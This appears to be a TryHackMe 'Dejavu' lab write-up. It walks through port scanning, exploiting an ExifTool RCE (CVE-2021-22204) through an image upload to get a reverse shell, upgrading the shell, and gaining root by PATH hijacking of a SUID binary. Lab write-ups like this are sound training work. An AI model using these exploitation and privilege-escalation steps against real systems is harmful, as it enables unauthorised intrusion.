---------------------

### TRYHACKME
### DEJAVU

---------------------

![image](https://github.com/user-attachments/assets/30e9cc6a-e8ce-4a69-adcb-77209de52e7c)

---------------------

- Rustscan's network scan

      ❯ rustscan -a 10.10.53.66 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.53.66:22
      Open 10.10.53.66:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")                                                                                           
                                                                                                                                                          
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 05:11 EDT                                                                              
      NSE: Loaded 156 scripts for scanning.                                                                                                               
      NSE: Script Pre-scanning.                                                                                                                           
      NSE: Starting runlevel 1 (of 3) scan.                                                                                                               
      Initiating NSE at 05:11                                                                                                                             
      Completed NSE at 05:11, 0.00s elapsed                                                                                                               
      NSE: Starting runlevel 2 (of 3) scan.                                                                                                               
      Initiating NSE at 05:11                                                                                                                             
      Completed NSE at 05:11, 0.00s elapsed                                                                                                               
      NSE: Starting runlevel 3 (of 3) scan.                                                                                                               
      Initiating NSE at 05:11                                                                                                                             
      Completed NSE at 05:11, 0.00s elapsed                                                                                                               
      Initiating Ping Scan at 05:11                                                                                                                       
      Scanning 10.10.53.66 [2 ports]                                                                                                                      
      Completed Ping Scan at 05:11, 0.26s elapsed (1 total hosts)                                                                                         
      Initiating Parallel DNS resolution of 1 host. at 05:11                                                                                              
      Completed Parallel DNS resolution of 1 host. at 05:11, 0.01s elapsed                                                                                
      DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                    
      Initiating Connect Scan at 05:11                                                                                                                    
      Scanning 10.10.53.66 [2 ports]                                                                                                                      
      Discovered open port 80/tcp on 10.10.53.66
      Discovered open port 22/tcp on 10.10.53.66
      Completed Connect Scan at 05:11, 0.30s elapsed (2 total ports)
      Initiating Service scan at 05:11
      Scanning 2 services on 10.10.53.66
      Completed Service scan at 05:11, 26.56s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.53.66.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 05:11
      Completed NSE at 05:12, 24.83s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 05:12
      Completed NSE at 05:12, 9.76s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 05:12
      Completed NSE at 05:12, 0.00s elapsed
      Nmap scan report for 10.10.53.66
      Host is up, received syn-ack (0.27s latency).
      Scanned at 2024-08-14 05:11:24 EDT for 62s
      
      PORT   STATE SERVICE REASON  VERSION
      22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
      | ssh-hostkey: 
      |   3072 30:0f:38:8d:3b:be:67:f3:e0:ca:eb:1c:93:ad:15:86 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmic6XezAzYEOi8jWokLDH+7zn6LyOEn/8jPWyhJ6yZ6TVq33kzY5NiYwaxYEpj0ohIm2njEHj/4I1a+C7JjRAqwLsVpE/LnHWmvHKCWxqIX+WXJIi8oddWig/xJNlbWLlWBSv/YzIan+x1Ov+/oCGupgy86GyLyKULGUONATY72Ff9VuTQTaZvFgjJDGsdh4obY0ZN4r2PzbzCP6vPtwESx/IYm2fCZwsoev/ml8HSKdTSRacavnzxShr6PuYBOSJmVBbc9sI4rET/7I6bkS8gqAsCPx3DJ0IS+JlVMvXhp3ze5fgAlGf01Xr2lpPxb5uKHVZxu9htJUHv0wRUwASkx2YlTOSWvrGsGWblcKYvh0YmPu37XuRVTEe62ph6c2LPAfBO8WU4/vOo0aanue6W0b9joomDDbAltWBazLj8r87hQnELu4tSjS7MiV2H6q9Ak05ZniG1RYGANC+3IP0kWvehVd1I4FHkIdfQk5Rxv+lqHGi+hRpnzIh0kzk0bc=
      |   256 46:09:66:2b:1f:d1:b9:3c:d7:e1:73:0f:2f:33:4f:74 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOCGDIUZtk9Q/FYmvIUjhKFAO7dMgZgAMgwUoXR+yGb4B/fovHWBLq5Du9i8kyd8FmiY8efx2V8VE8STgcmNQi8=
      |   256 a8:43:0e:d2:c1:a9:d1:14:e0:95:31:a1:62:94:ed:44 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/RIq26NuKMoJYyJgIRuwjFFrk7kgMqQEcRVMTOlftl
      80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-title: Dog Gallery!
      |_http-favicon: Unknown favicon MD5: C1359D2DB192C32E31BDE9E7BDE0243B

----------------------

- Ffuf directory fuzzing output

![image](https://github.com/user-attachments/assets/674ececf-595a-476b-bc1d-a4917b34286d)

- Sitemap

![image](https://github.com/user-attachments/assets/8d6b3161-a1ad-422a-831b-3553af5b13b0)

- Route `/dog/getexifdata/[id]` reveals the exifversion which is vulnerable to `RCE`

 ![image](https://github.com/user-attachments/assets/9a99334a-f76b-4036-9546-3f9fb7297f40)

- Route `/upload` allows us to upload images

  ![image](https://github.com/user-attachments/assets/5de485a2-f1f0-43b1-a93d-3dfe7054b61c)

- I got a python exploit for the cve [CVE-2021-22204](https://github.com/UNICORDev/exploit-CVE-2021-22204)

![image](https://github.com/user-attachments/assets/e267a366-1b8b-4f3a-89b6-50208299e880)

- To execute the revshell, go to route `/dog/getexifdata/[imageid]` to spawn your reverse shell

--------------------

### Spawning interactive tty without python with /usr/bin/script

- Using `/usr/bin/script` to spawn interactive tty

      /usr/bin/script -qc /bin/bash /dev/null
      ctrl + z
      stty raw -echo;fg;reset

- Shell

![image](https://github.com/user-attachments/assets/2c6c51f3-3d28-49a8-a291-ae0d39f1bb5c)

### Privesc with $PATH variable

- I found a suid binary with `find / -type f -perm -u=s 2</dev/null` and discovered the `serverManager` binary

![image](https://github.com/user-attachments/assets/92dda248-9c09-4c3e-9c4f-fda42d6ca939)

- Checking the source code shows it does runs systemctl without path being declared e.g `systemctl` instead of `/usr/bin/systemctl`

  ![image](https://github.com/user-attachments/assets/8716fcaf-6e4d-4abb-864f-dc94e3833546)

- I created a systemctl file that spawn `bash` with `echo "/bin/bash" > systemctl` and change the path env variable to check the current directory for binaries with `export PATH=.:$PATH`.

  ![image](https://github.com/user-attachments/assets/18026f23-5e02-4fa5-a3f8-d52dfa58cf80)

- Root

  ![image](https://github.com/user-attachments/assets/ca84df27-2994-42bc-9619-5fa1c151c70a)



  





